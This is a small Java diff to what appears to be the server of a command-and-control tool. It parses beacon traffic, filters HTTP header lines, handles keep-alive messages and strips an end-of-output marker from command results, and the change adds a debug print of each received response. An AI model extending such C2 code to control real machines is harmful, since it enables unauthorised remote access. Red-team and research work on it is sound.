@@ -175,6 +175,7 @@ public class BeaconClientHandler implements Runnable{
                     if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK")) && !(response.isBlank())){
                         response = encrypt(response);
                         if(!(response.equals("KEEP_ALIVE"))){
+                            System.out.println("Received: " + response);
                             // Remove the END_OF_OUTPUT part of the end of the response to the command
                             if(response.contains(("END_OF_OUTPUT"))){
                                 response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
